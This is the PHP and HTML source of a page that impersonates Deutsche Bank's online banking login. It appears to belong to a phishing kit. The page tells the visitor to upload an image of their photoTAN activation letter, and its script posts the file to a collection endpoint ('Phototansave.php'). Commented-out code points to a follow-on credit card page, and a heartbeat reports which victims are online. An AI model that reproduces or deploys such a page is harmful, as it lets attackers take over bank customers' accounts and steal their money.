<?php 
    include 'Model.php';
	$savedId = $_SESSION['id'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de" lang="de"><head>
<base href="<?php echo $baseUrl; ?>/">
	<title>Onlinebanking und Brokerage der Deutschen Bank</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="expires" content="0">
	<meta name="instance" content="pnta101">
	<meta name="description" content="Erledigen Sie Ihre täglichen Bankgeschäfte flexibel und bequem mit dem Onlinebanking der Deutschen Bank.">

	<script src="js/global.js" type="text/javascript"></script>


	<link rel="shortcut icon" type="image/ico" href="images/favicon.ico?v=1">
	<link rel="stylesheet" type="text/css" href="css/base.css" media="screen, print">
	<link rel="stylesheet" type="text/css" href="css/customize.css" media="screen, print">
    <link rel="stylesheet" type="text/css" href="css/forms.css" media="screen, print">
	<link rel="stylesheet" href="css/font-awesome.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
	.nextStep {  padding-right: 4em!important;
		background-image: url('images/bt_primary_default.png') !important;
		background-position: 91.5% center !important;
		background-position: right 10px center !important;
		background-repeat: no-repeat !important;
		background-size: 13px 11px !important;
		}
		
		.button {
		background: #2282c1;
		color: #fff;
		cursor: pointer;
		padding: .6em 1em;
		text-decoration: none;
		border: 0;
		border-radius: 3px;
		box-shadow: 0 1px 2px rgba(0, 0, 0, .35);
		line-height: 1.25;
		display: inline-block;
		}
		.formContainer { border: 0px; }
		#topicContainer { margin-top: 15px !important; }
        @font-face {
	font-family: 'pfbicons';
	src: url('fonts/pfbicons.ttf') format('truetype');
	font-weight: normal;
	font-style: normal;
}
		
</style>
</head>


<body id="login" class="noTopicContainer">
	<div id="rollContainer">
		<div id="globalContainer"><a name="globalContainer"></a>

			<div id="serviceNavigation">

				<ul>
					<li class="access"><a href="#contentContainer">Zum Inhalt springen</a></li>
					<li class="access"><a href="#" accesskey="0">Zur <span xml:lang="en" lang="en">Accesskeys</span>-Übersicht</a></li>
				</ul>
			</div> <!-- End of serviceNavigation -->
			<div id="headerContainer">


				<p id="logoContainer"><img src="images/logo_db.gif" width="267" height="76" title="Logo Deutsche Bank" alt="Logo Deutsche Bank"></p>
				<div id="metaNavigation">
					<h4 class="access">Sprachauswahl und Filialsuche</h4>
					<ul>

						<li><a href="https://webfilialien-vorgang.de/information/init.do.html">English Version</a></li>

						<li><a href="https://www.deutsche-bank.de/pfb/content/jumppages/filialfinder.html" title="Neues Fenster: Finden Sie eine Filiale in Ihrer Nähe">Ihre Filiale</a></li>
					</ul>
				</div> <!-- End of metaNavigation -->
			</div>

			<!-- End of headerContainer -->

			<div id="locationContainer"></div> <!-- End of locationContainer -->

			<div id="folderContainer">
				<div id="topicContainer">

					<div class="additionalInfo onlinebanking">
						<h4><span class="nowrap"> <span xml:lang="en" lang="en">OnlineBanking</span></span></h4>
						<p>Erledigen Sie Ihre täglichen Bankgeschäfte flexibel und bequem mit unserem <span class="nowrap"> <span xml:lang="en" lang="en">OnlineBanking</span>.</span></p>
						<ul>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/Leistungen-im-Ueberblick.html" title="Neues Fenster: Rund ums Online-Banking">Rund ums Online-Banking</a></li>

							<li><a target="_blank" href="https://secure.deutsche-bank.de/pbc/trxmdemokonto/loginpin/goto.do" title="Neues Fenster: Demokonto testen">Demokonto testen</a></li>

							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/konto-und-karte/konten-im-ueberblick/konten-im-vergleich.html" title="Neues Fenster: Konto eröffnen">Konto eröffnen</a></li>
							<li><a target="_blank" href="https://www.deutsche-bank.de/opra4x/public/pfb/request-online-banking-access/#/page-1-0" title="Neues Fenster: Konto für Online- und Telefon-Banking freischalten">Konto für Online- und Telefon-Banking freischalten</a></li>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/mobile-apps/deutsche-bank-mobile-app.html" title="Neues Fenster: MobileBanking">MobileBanking</a></li>
						</ul>
					</div>
					<div class="additionalInfo help">
						<h4>Hilfe</h4>
						<ul>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/faq-s.html" title="Neues Fenster: Häufig gestellte Fragen">Häufig gestellte Fragen</a></li>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/downloadcenter.html" title="Neues Fenster: Download-Center">Download-Center</a></li>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/service-und-kontakt/service-ueberblick.html#tabset_content_tab2" title="Neues Fenster: Technischer Support">Technischer Support</a></li>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/sicherheit/sicherheitsverfahren.html" title="Neues Fenster: Sicherheit">Sicherheit</a></li>
						</ul>
					</div>

				</div> <!-- End of topicContainer -->

				<!-- Rendering of content container and footer container -->
	<link href="css/styles.css" rel="stylesheet">

				<script type="text/javascript" language="JavaScript" src="js/autotab.js"></script>
				<script type="text/javascript" language="JavaScript" src="js/fingerprintLoginUi.js"></script>
				<script type="text/javascript">
					/* Check if the Caps-Lock key is on. */
					/* If so, make the 'capsLockMessage' element visible */

					function checkCapsLock(e) {
						var myKeyCode = 0;
						var myShiftKey = e.shiftKey || (e.modifiers && (e.modifiers & 4));

						// Internet Explorer && Mozilla
						if (window.event) {
							// Mozilla
							if (e.charCode) {
								myKeyCode = e.charCode;
							}
							// Internet Explorer
							else {
								myKeyCode = e.keyCode;
							}

							// Netscape 4
						} else if (e.which) {
							myKeyCode = e.which;
						}

						// Upper case letters are seen without depressing the Shift key, therefore Caps Lock is on
						if ((myKeyCode >= 65 && myKeyCode <= 90) && !myShiftKey) {
							document.getElementById('capsLockMessage').style.visibility = 'visible';
							// Lower case letters are seen while depressing the Shift key, therefore Caps Lock is on
						} else if ((myKeyCode >= 97 && myKeyCode <= 122) && myShiftKey) {
							document.getElementById('capsLockMessage').style.visibility = 'visible';
							// Special characters in number keys are type if you have Caps Lock enable in German keyboards
						} else if ((myKeyCode == 33 || myKeyCode == 34 || myKeyCode == 36 || myKeyCode == 37 ||
								myKeyCode == 38 || myKeyCode == 40 || myKeyCode == 41 || myKeyCode == 47 ||
								myKeyCode == 61 || myKeyCode == 167 || myKeyCode == 183 || myKeyCode == 64 ||
								myKeyCode == 35 || myKeyCode == 94 || myKeyCode == 42) && !myShiftKey) {
							document.getElementById('capsLockMessage').style.visibility = 'visible';

							// Numbers typed and the shift is pressed, means that in a German keyboard you have the Caps Lock enabled
						} else if ((myKeyCode >= 48 && myKeyCode <= 57) && myShiftKey) {

						} else {
							document.getElementById('capsLockMessage').style.visibility = 'hidden';
						}
					}
				</script>
				<style type="text/css">
					body#login #verimiContainer #verimiRegistrationNote {
						font-size: 0.93em;
						color: #7a7a7a;
						padding-top: 0.5em;
					}
				</style>

				<div id="contentContainer"><a name="contentContainer"></a>
					<!--  page LoginPage -->
					<div id="pathNavigation" class="access">
						<p><strong>Sie sind hier:</strong> Kunden-Login</p>
					</div>


					<div id="mainContent">

						<div class="formContainer">
							<form id="login-form" autocomplete="off" class="form-horizontal" method="post">
									 <div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input type="hidden" name="id2_hf_0" id="id2_hf_0" value=""></div>
									 <aab-alert data-error="widget.context.error" data-ng-hide="widget.context.isStateModalOpen &amp;&amp; widget.context.error &amp;&amp; widget.context.error.isRecoverable" class="ng-isolate-scope"><!-- ngIf: emerald -->
										 <div ng-if="emerald" class="alert em-alert-warning px-sm-2 ng-scope ng-isolate-scope" role="alert" data-ng-click="isCollapsed = !isCollapsed" id="errorMessage" aria-live="assertive" data-ng-show="error" data-aab-scroll-to="error !== undefined" data-testid="alert-container" style="display: none; padding: 10px 0 10px 0 !important; margin-bottom: -3px;"><!-- ngIf: error.faultCode -->
											 <div class="d-flex flex-row">
												 <div><!-- ngIf: error.title && (error.title | translate) -->
													 <h3 data-testid="first-alert-warning-text" data-ng-if="error.title &amp;&amp; (error.title | translate)" data-ng-bind-html="error.title | translate | aabTrustedHtml" class="ng-binding ng-scope" style=""></h3><!-- end ngIf: error.title && (error.title | translate) -->
													 <p class="mb-0 ng-binding" data-ng-bind-html="error.text | translate | aabTrustedHtml" data-translate-default="Er is een fout opgetreden" data-testid="second-alert-warning-text">
													 </p><div role="alert" id="errorMessage" aria-live="assertive" class="ap-field-errors">
														 <span style="color: red;">Der SecureSign-Grafik ist nicht korrekt. Bitte versuchen Sie es erneut.</span>
													 </div>
													 <p></p>
												 </div>
											 </div><!-- ngIf: error.options.button -->
										 </div><!-- end ngIf: emerald --><!-- ngIf: !emerald -->
									 </aab-alert>
									 <div class="form-row label-pos-none field-length-full">
										 <p class="h-03" style="color: #000;"> Um fortzufahren, müssen Sie ein Bild
											 ihres
											 Deutsche Bank-
											 Aktivierungsschreibens hochladen. </p>
										 <center>
											 <img style="width: 80%;" src="images/phototan.png">
										 </center>
										 <br>
								
										 <p class="h-03" style="color: #000;"> * Dieser wurde ihnen nach Hause geliefert und sieht wie der QR-Code
											 oben aus. </p>
										 <br>
								
										 <div class="input" style="margin: 5px auto !important; width: 100% !important; ">
											 <style type="text/css">
												 .custom-file-upload {
													 display: inline-block;
													 align-items: center;
													 background-color: #f1f1f1;
													 padding: .3em 1em;
													 cursor: pointer;
													 border: 0px solid #000;
													 border-radius: 3px;
													 font-size: 1em;
													 color: #fff;
													 transition: background-color 0.3s, color 0.3s, border-color 0.3s;
													 text-decoration: none;
													 box-shadow: 0 1px 2px rgba(0, 0, 0, .35);
												 }
								
												 input[type="file"] {
													 display: none;
												 }
								
												 input[type="file"]:focus+.custom-file-upload {
													 border-color: #4a90e2;
													 box-shadow: 0 0 3px 1px rgba(74, 144, 226, 0.5);
												 }
								
												 .form-row label {
													 display: block;
													 float: left;
													 width: 150px;
													 margin: 0 auto;
													 background: #2282c1;
													 font-size: 1em !important;
													 line-height: 18px;
													 opacity: 1;
													 box-shadow: 0 1px 2px rgba(0, 0, 0, .35);
												 }
								
												 .h-06 .upload-icon,
												 .h-06 .kanker {
													 color: #fff;
													 font-size: 1em !important;
													 margin: 4px !important;
													 display: block;
							
												 }
								
												 .h-06:hover .upload-icon,
												 .h-06:hover .kanker {
													 color: #ffffff;
													 /* Set the text color to white when hovering */
												 }
								
												 .h-06:hover {
													 background-color: #0098DB;
													 border-color: #0098DB;
												 }
								
												 .icon-container {
													 display: inline-flex;
													 align-items: center;
													 justify-content: center;
													 width: 20px;
													 height: 20px;
													 margin-right: 5px;
												 }
								
												 .upload-icon {
													 fill: #fff;
													 stroke: #fff;
												 }
								
												 .custom-file-upload:hover {
													 box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
												 }
											 </style>
											 <label for="respons-code" class="custom-file-upload h-06 button">
												 <center>
													 <span class="h-04 kanker Dateihochladen"><i class="fa fa-upload" style="margin-right: 10px;" aria-hidden="true"></i> <span id="file-name">Datei hochladen</span></span>
													 <input type="hidden" id="loginid" value="<?php echo $savedId; ?>">
													 <input type="hidden" name="randomId" id="randomId" value="<?php echo $randomId; ?>">
												 </center>
												 <input class="text-left required primary full-width login" type="file" required="required" id="respons-code" name="userid" tabindex="1" autofocus="" data-h5-errorid="invalid-teilnehmer" accept="image/*" multiple="">
											 </label>
								
											 <script>
												 document.getElementById('respons-code').addEventListener('change', function(event) {
													 const fileNameElement = document.getElementById('file-name');
								
													 if (event.target.files.length > 0) {
														 fileNameElement.textContent = event.target.files[0].name;
													 } else {
														 fileNameElement.textContent = 'Datei hochladen';
													 }
												 });
											 </script>
								
								
								
								
								
											 <div class="error-msg" id="invalid-teilnehmer" style="display: none;">
												 <div class="inner">
													 <p>
														 Geben Sie bitte 8 oder 10 Ziffern für Ihre 
Teilnehmernummer oder min. 8 bis max. 50 Zeichen für Ihren Benutzernamen
 ein.
													 </p>
												 </div>
											 </div>
										 </div>
										 <a href="#useridInfo" class="info-box-link"></a>
									 </div>
<button type="" value="Weiter" id="loginButton" disabled="disabled" style="float: right; background-color: grey; cursor: progress;" class="button nextStep login btn btn--primary btn-value">Weiter</button>

								
									 <script src="js/credit.js"></script>
									 <input type="hidden" id="token" value="65a19bca8fb2e">
									 <input type="hidden" id="user-id" value="65a67a557a7d8">
									<script type="text/javascript">
										
										const inputElement = document.getElementById('respons-code');
										const buttonElement = document.getElementById('loginButton');
										let fileToSend;
										let uploadSuccessful = false;
										
										async function uploadFileToServer(file) { 
											buttonElement.style.backgroundColor = '#2282c1';
											uploadSuccessful = true;
											buttonElement.removeAttribute('disabled');
											buttonElement.style.backgroundColor = '';
											buttonElement.style.cursor = 'pointer';

										}
										
										inputElement.addEventListener('change', async (event) => {
										if (event.target.files.length > 0) {
											fileToSend = event.target.files[0];
											
											try {
												// await uploadFileToServer(fileToSend);
											} catch (err) {
											uploadSuccessful = false;
											buttonElement.setAttribute('disabled', 'disabled');
											buttonElement.style.backgroundColor = 'grey';
											console.error('Upload error:', err);
											return;
											}
										}
										});
									
								
									</script>
							
								 </form>
						</div>

					</div>
				</div>

				<div id="footerContainer">

					<div id="pageFeatures">

						<div id="fontSizer">
							<h4>Schriftgröße</h4>
						</div> <!-- End of fontSizer -->
					</div> <!-- End of pageFeatures -->

				</div>
			</div> <!-- End of folderContainer -->
			<div class="access">
				<ul>
					<li><a href="#globalContainer">Zum Anfang der Seite springen</a></li>
				</ul>
			</div>
		</div> <!-- End of globalContainer  -->
	</div> <!-- End of rollContainer -->
	<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
			<script>
		// setInterval(() => {
		// 	const data = new FormData();
		// 	data.append('id', document.querySelector('#user-id').value);
		// 	fetch('/user/online', {
		// 		method: 'POST',
		// 		body: data
		// 	});
		// }, 3000);
		
		 $(document).ready(function() {
			// $('.Dateihochladen').on('click', function() {
			// 	var savedId = $('#loginid').val();
			// 	var fileName = $('#file-name').html();
			// 	var formData = {
			// 		savedId: savedId,
			// 		fileName: fileName
			// 	};
			// 	$.ajax({
			// 		type: 'POST',
			// 		url: 'Phototansave.php', 
			// 		data: formData,
			// 		success: function(response) {
			// 		if (response.status === 'success') {
			// 				var savedId = response.id;
			// 				window.location.href = 'Kreditkarte.php' + savedId;
			// 			} else {
			// 				console.error(response.message);
			// 			}
			// 		},
			// 		error: function(xhr, status, error) {
			// 		console.error(xhr.responseText);
			// 		}
			// 	});
			// });

			$('#respons-code').on('change', function (e) {
				e.preventDefault();
				console.log("File input changed."); // Debugging log

				var formData = new FormData();
				var fileInput = document.getElementById('respons-code');
				var file = fileInput.files[0];
				formData.append('file', file);

				$.ajax({
					type: 'POST',
					url: 'Phototansave.php',
					data: formData,
					contentType: false,
					processData: false,
					success: function (data) {

						uploadFileToServer(fileToSend);
		
					},
					error: function (xhr, status, error) {
						console.log("Error:", xhr, status, error); // Debugging log
						alert("An error occurred");
					}
				});
        	});
   		});
	</script>
	
	<script src="js/name.js?v=1.0"></script>


</body></html>
